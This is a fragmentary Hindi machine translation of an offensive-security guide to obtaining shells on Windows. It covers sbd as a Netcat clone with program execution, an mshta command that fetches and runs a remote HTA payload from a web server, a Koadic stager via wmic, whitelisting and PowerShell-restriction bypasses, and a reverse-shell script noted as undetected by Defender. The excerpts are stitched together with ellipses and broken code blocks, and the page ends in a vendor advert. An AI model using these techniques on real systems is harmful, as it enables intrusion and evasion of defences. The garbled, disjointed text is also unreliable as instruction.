...
स्वाभाविक रूप से, **विंडोज में SUID फ़ाइलें या सुडो विशेषाधिकार नहीं हैं**, लेकिन यह उपयोगी है जानने के लिए **कैसे** कुछ **बाइनरी** (अ)दुरुपयोग किया जा सकता है कुछ अप्रत्याशित क्रियाएँ करने के लिए जैसे **कोड का विचार करें**।
...
**sbd** एक Netcat-क्लोन है, जो सुवाह्य होने के लिए डिज़ाइन किया गया है और मजबूत एन्क्रिप्शन प्रदान करने के लिए। यह Unix-जैसे ऑपरेटिंग सिस्टम पर और Microsoft Win32 पर चलता है। sbd में AES-CBC-128 + HMAC-SHA1 एन्क्रिप्शन (Christophe Devine द्वारा), प्रोग्राम निष्पादन (-e विकल्प), स्रोत पोर्ट का चयन, विलंब के साथ निरंतर पुनर-संबंधन, और कुछ अन्य अच्छी विशेषताएँ शामिल हैं। sbd केवल TCP/IP संचार का समर्थन करता है। sbd.exe (Kali linux वितरण का हिस्सा: /usr/share/windows-resources/sbd/sbd.exe) एक Netcat विकल्प के रूप में विंडोज़ बॉक्स पर अपलोड किया जा सकता है।
...
हम एक नए विंडोज शेल को खोलने के लिए OpenSSH का उपयोग कर सकते हैं।
...
```
जाल संचार कॉल करने वाली प्रक्रिया: **mshta.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```bash
mshta http://webserver/payload.hta
```
जांच करने वाली प्रक्रिया: **mshta.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```bash
...
**आप बहुत आसानी से एक Koadic zombie को डाउनलोड और execute कर सकते हैं उसिंग the stager wmic**
...
आप इस तकनीक का उपयोग ऐप्लिकेशन व्हाइटलिस्टिंग और Powershell.exe प्रतिबंधों को दूर करने के लिए कर सकते हैं। जैसा कि आपको एक PS शैल के साथ प्रॉम्प्ट किया जाएगा।\
...
**Shells** फ़ोल्डर में, कई विभिन्न शैल्स हैं। Invoke-_PowerShellTcp.ps1_ डाउनलोड और execute करने के लिए स्क्रिप्ट की एक प्रति बनाएं और फ़ाइल के अंत में जोड़ें:
```
...
```
Defender इसे हानिकारक कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).
...
```
**मान्यताप्राप्त कोड के रूप में पहचाना गया**
...
सबसे महत्वपूर्ण सुरक्षा गड़बड़ियों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरे तकनीकी स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक के मुद्दे खोजता है। [**मुफ्त में आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।
